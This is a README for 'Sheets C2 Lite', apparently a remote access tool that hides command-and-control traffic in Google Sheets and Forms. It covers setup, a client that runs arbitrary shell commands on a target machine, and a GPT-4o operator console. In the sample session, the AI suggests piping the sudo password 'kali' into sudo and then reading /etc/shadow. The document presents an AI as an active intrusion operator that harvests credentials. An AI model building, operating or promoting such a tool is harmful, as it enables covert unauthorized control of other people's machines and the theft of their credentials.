# Sheets C2 Lite

Covert command-and-control framework using Google Sheets as a communication channel with an AI-powered operator console.

---

## Features

- **Covert C2 channel** — all traffic goes to `docs.google.com`. Blends with normal Google Workspace usage; no listener, no open port, no inbound connection to the operator.
- **Shell command execution** — arbitrary bash with stdout/stderr/returncode capture and sudo pipe support.
- **AI operator console (GPT-4o)** — type commands in plain English; the AI translates, dispatches, and interprets results.
- **Background result polling** — results auto-display as they arrive; the AI suggests the next step automatically.
- **Heartbeat system** — client sends OS/hostname/user info on startup and every 10 cycles; operator console uses it for context-aware command generation.
- **Session facts** — confirmed credentials, root access, and OS details are automatically extracted from results and injected into every GPT request.
- **Dangerous command warnings** — irreversible commands (rm -rf, kill, shutdown, etc.) always require explicit confirmation.
- **Auto / confirm send modes** — run hands-off or review every command before it goes out.

---

## Architecture

```
  OPERATOR MACHINE                        TARGET MACHINE
  ┌─────────────────────┐                ┌──────────────────────┐
  │      server.py      │                │      client.py       │
  │  (AI operator CLI)  │                │   (poll + execute)   │
  └────────┬────────────┘                └──────────┬───────────┘
           │                                        │
           │  HTTPS POST                            │  HTTPS GET (CSV)
           ▼                                        ▼
  ┌─────────────────────┐            ┌──────────────────────────┐
  │  Inbox Google Form  │──appends──▶│  Google Spreadsheet      │
  │  (write commands)   │            │  ┌──────────────────┐    │
  └─────────────────────┘            │  │  config tab      │    │
                                     │  ├──────────────────┤    │
  ┌─────────────────────┐            │  │  inbox tab       │    │
  │  Outbox Google Form │◀──appends──│  ├──────────────────┤    │
  │  (write results)    │            │  │  outbox tab      │    │
  └─────────────────────┘            │  └──────────────────┘    │
           │                         └──────────────────────────┘
           │  HTTPS GET (CSV)
           ▼
  server.py reads results
           │
           ▼
  ┌─────────────────────┐
  │     OpenAI API      │
  │      (GPT-4o)       │
  └─────────────────────┘
```

---

## Prerequisites

- Python 3.10+
- A Google account (free tier is sufficient)
- An OpenAI API key

---

## Setup

### 1. Clone and install

```bash
git clone git@github.com:FelmanNadav/saas-rat.git
cd saas-rat
python -m venv venv
source venv/bin/activate        # Windows: venv\Scripts\activate
pip install -r requirements.txt
```

Verify it works:

```bash
python -c "import requests, openai; print('OK')"
```

### 2. Create the Google Sheet

1. Go to [sheets.google.com](https://sheets.google.com) and create a new spreadsheet. Name it anything (e.g. `C2`).
2. Create three tabs named exactly: `config`, `inbox`, `outbox`.
3. Add headers to each tab (row 1):

**config**
```
key    value
```

**inbox**
```
command_id    command    payload    target    status    created_at
```

**outbox**
```
command_id    client_id    status    result    timestamp
```

4. Share the spreadsheet: Share → Anyone with the link → **Viewer**.
5. Note the spreadsheet ID from the URL:
   `https://docs.google.com/spreadsheets/d/<SPREADSHEET_ID>/edit`
6. Note each tab's GID from the URL when you click on the tab:
   `...edit#gid=<GID>`

### 3. Create the Google Forms

You need two forms — one for the operator to write commands (inbox), one for the client to write results (outbox).

**Outbox form** (results from client → server):

1. Go to [forms.google.com](https://forms.google.com), create a new form.
2. Add 5 Short answer questions titled exactly:
   `command_id`, `client_id`, `status`, `result`, `timestamp`
3. Responses tab → Link to Sheets → select your spreadsheet → select the `outbox` tab.
4. Get entry IDs: open the form preview, right-click → Inspect → search for `entry.` in the HTML. Note the `entry.XXXXXXX` ID for each field.

**Inbox form** (commands from server → client):

1. Create a second form.
2. Add 6 Short answer questions titled exactly:
   `command_id`, `command`, `payload`, `target`, `status`, `created_at`
3. Link responses to the `inbox` tab of the same spreadsheet.
4. Note the entry IDs the same way.

### 4. Configure .env

```bash
cp .env.example .env
```

Edit `.env` with your real values:

```
SPREADSHEET_ID=<from sheet URL>
CONFIG_GID=<gid of config tab>
INBOX_GID=<gid of inbox tab>
OUTBOX_GID=<gid of outbox tab>
FORMS_URL=https://docs.google.com/forms/d/e/<OUTBOX_FORM_ID>/formResponse
FORMS_FIELD_MAP={"command_id":"entry.XXX","client_id":"entry.XXX","status":"entry.XXX","result":"entry.XXX","timestamp":"entry.XXX"}
INBOX_FORMS_URL=https://docs.google.com/forms/d/e/<INBOX_FORM_ID>/formResponse
INBOX_FORMS_FIELD_MAP={"command_id":"entry.XXX","command":"entry.XXX","payload":"entry.XXX","target":"entry.XXX","status":"entry.XXX","created_at":"entry.XXX"}
OPENAI_API_KEY=sk-...
```

### 5. Populate the config tab

Add these rows to the `config` tab of your spreadsheet:

| key | value |
|-----|-------|
| `poll_interval_sec` | `30` |
| `poll_jitter_min` | `5` |
| `poll_jitter_max` | `15` |
| `client_id` | `client-01` |

---

## Usage

### Start the client (on target machine)

```bash
python client.py
```

The client polls the inbox every 30–45 seconds (configurable), sends a heartbeat on startup, and executes any pending commands.

### Send a command (operator machine)

```bash
python server.py send --command system_info
python server.py send --command shell --payload '{"cmd": "whoami"}'
python server.py send --command echo --payload '{"msg": "hello"}'
```

### Collect results

```bash
python server.py collect
python server.py collect --id <command_id>
```

### AI mode

```bash
python server.py ai
```

Choose auto or confirm mode at startup, then type commands in plain English:

```
────────────────────────────────────────────────
  Sheets C2  —  AI Operator Console
────────────────────────────────────────────────

  Auto-send commands or confirm each one? [A]uto / [C]onfirm: a
  Auto mode. Commands sent immediately.

  Type a command in plain language, or use: mode auto/confirm, output raw/interpreted, exit.

> get system info
  Sent  system_info  ID: 3f2a1c...

[Result arrived] 3f2a1c: system_info → success
  os: Linux | hostname: target | user: kali | arch: x86_64
  [Suggestion] Check sudo access with echo 'kali' | sudo -S -l

> do it
  Sent  shell  ID: 9b4e2a...

[Result arrived] 9b4e2a: echo 'kali' | sudo -S -l → success
  [Fact] sudo credentials confirmed: password='kali'
  sudo: ALL commands on all targets
  [Suggestion] Read /etc/shadow with echo 'kali' | sudo -S cat /etc/shadow

> show raw
total 48
drwxr-xr-x  3 root root 4096 ...
...

> exit
```

**Mid-session commands** (not sent to AI):

| Command | Effect |
|---------|--------|
| `mode auto` / `mode confirm` | Switch send mode |
| `output raw` / `output interpreted` | Switch output mode |
| `do it` / `yes` / `y` | Execute the last suggested command |
| `exit` / `quit` | End the session |

---

## Project Structure

```
saas-rat/
├── common.py      # Shared I/O: .env loading, CSV sheet reads, Google Forms writes
├── client.py      # Target-side poll loop: fetches commands, executes, returns results
├── server.py      # Operator CLI: send commands, collect results, AI chat mode
├── .env.example   # Configuration template
└── docs/
    ├── DESIGN.md               # Full technical design document
    └── DESIGN_LITE_ORIGINAL.md # Original design spec
```

---

## Limitations

- Inbox and outbox tabs are append-only (Google Forms write path). Rows must be cleared manually.
- Minimum command round-trip time is one full client poll cycle (default ~30–45 seconds).
- No multi-client routing — all connected clients execute all pending commands.
- No retry logic on network failures.
- Session state (facts, history, command log) is in-memory only and lost on exit.
